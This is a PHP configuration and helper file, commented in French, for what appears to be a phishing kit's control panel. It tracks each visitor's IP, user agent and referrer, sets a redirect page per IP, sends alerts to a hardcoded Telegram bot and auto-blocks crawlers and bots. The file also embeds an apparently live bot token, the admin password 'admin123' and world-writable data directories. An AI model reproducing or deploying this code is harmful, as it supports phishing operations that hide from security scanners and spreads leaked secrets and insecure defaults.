<?php
session_start();

// Configuration Telegram
define('TELEGRAM_BOT_TOKEN', '8374666758:AAErbv-KXiKRuPpuEC2sTY6JGTf8UGRPqOA');
define('TELEGRAM_CHAT_ID', '-4970477627');

// Mot de passe admin
define('ADMIN_PASSWORD', 'admin123');

// Chemins des fichiers de données
define('DATA_DIR', __DIR__ . '/data/');
define('VISITORS_FILE', DATA_DIR . 'visitors.json');
define('REDIRECTS_FILE', DATA_DIR . 'redirects.json');

// Créer le dossier data s'il n'existe pas
if (!file_exists(DATA_DIR)) {
    mkdir(DATA_DIR, 0777, true);
}

// Initialiser les fichiers JSON s'ils n'existent pas
if (!file_exists(VISITORS_FILE)) {
    file_put_contents(VISITORS_FILE, json_encode([]));
}

if (!file_exists(REDIRECTS_FILE)) {
    file_put_contents(REDIRECTS_FILE, json_encode([]));
}

// Fonction pour obtenir l'IP du visiteur
function getVisitorIP() {
    $ip = '';
    
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    
    // Nettoyer l'IP (prendre seulement la première partie si multiple)
    $cleanIP = explode(',', $ip)[0];
    return trim($cleanIP);
}

// Fonction pour envoyer un message à Telegram
function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context  = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    
    return $result !== false;
}

// Fonction pour mettre à jour le statut du visiteur
function updateVisitorStatus($ip, $page, $status = 'online') {
    $visitors = json_decode(file_get_contents(VISITORS_FILE), true);
    
    // Nettoyer l'IP (prendre seulement la première partie si multiple)
    $cleanIP = explode(',', $ip)[0];
    $cleanIP = trim($cleanIP);
    
    // Garder la source si elle existe déjà, sinon la définir
    $source = isset($visitors[$cleanIP]['source']) ? $visitors[$cleanIP]['source'] : getVisitorSource();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    $visitors[$cleanIP] = [
        'ip' => $cleanIP,
        'current_page' => $page,
        'status' => $status,
        'last_seen' => time(),
        'source' => $source,
        'user_agent' => $userAgent,
        'blocked' => isIPBlocked($cleanIP)
    ];
    
    file_put_contents(VISITORS_FILE, json_encode($visitors, JSON_PRETTY_PRINT));
}

// Fonction pour obtenir la redirection pour une IP
function getRedirectForIP($ip) {
    $redirects = json_decode(file_get_contents(REDIRECTS_FILE), true);
    
    if (isset($redirects[$ip])) {
        return $redirects[$ip];
    }
    
    return null;
}

// Fonction pour définir la redirection pour une IP
function setRedirectForIP($ip, $page) {
    $redirects = json_decode(file_get_contents(REDIRECTS_FILE), true);
    $redirects[$ip] = $page;
    file_put_contents(REDIRECTS_FILE, json_encode($redirects, JSON_PRETTY_PRINT));
}

// Fonction pour bloquer une IP
function blockIP($ip) {
    $blockedFile = DATA_DIR . 'blocked_ips.json';
    $blocked = file_exists($blockedFile) ? json_decode(file_get_contents($blockedFile), true) : [];
    
    if (!in_array($ip, $blocked)) {
        $blocked[] = $ip;
        file_put_contents($blockedFile, json_encode($blocked, JSON_PRETTY_PRINT));
    }
}

// Fonction pour débloquer une IP
function unblockIP($ip) {
    $blockedFile = DATA_DIR . 'blocked_ips.json';
    $blocked = file_exists($blockedFile) ? json_decode(file_get_contents($blockedFile), true) : [];
    
    $blocked = array_filter($blocked, function($blockedIP) use ($ip) {
        return $blockedIP !== $ip;
    });
    
    file_put_contents($blockedFile, json_encode(array_values($blocked), JSON_PRETTY_PRINT));
}

// Fonction pour vérifier si une IP est bloquée
function isIPBlocked($ip) {
    $blockedFile = DATA_DIR . 'blocked_ips.json';
    if (!file_exists($blockedFile)) {
        return false;
    }
    
    $blocked = json_decode(file_get_contents($blockedFile), true);
    return in_array($ip, $blocked);
}

// Fonction pour obtenir la source du visiteur
function getVisitorSource() {
    if (isset($_SERVER['HTTP_REFERER']) && !empty($_SERVER['HTTP_REFERER'])) {
        $referer = $_SERVER['HTTP_REFERER'];
        $host = parse_url($referer, PHP_URL_HOST);
        return $host ?: 'Direct';
    }
    return 'Direct';
}

// Fonction pour vérifier automatiquement les bots
function autoCheckBot($ip, $userAgent) {
    require_once __DIR__ . '/auto_bot_blocker.php';
    
    if (isBotVisitor($userAgent, $ip)) {
        $reason = 'Auto-detected bot/crawler';
        autoBlockBot($ip, $userAgent, $reason);
        return true;
    }
    return false;
}
?>
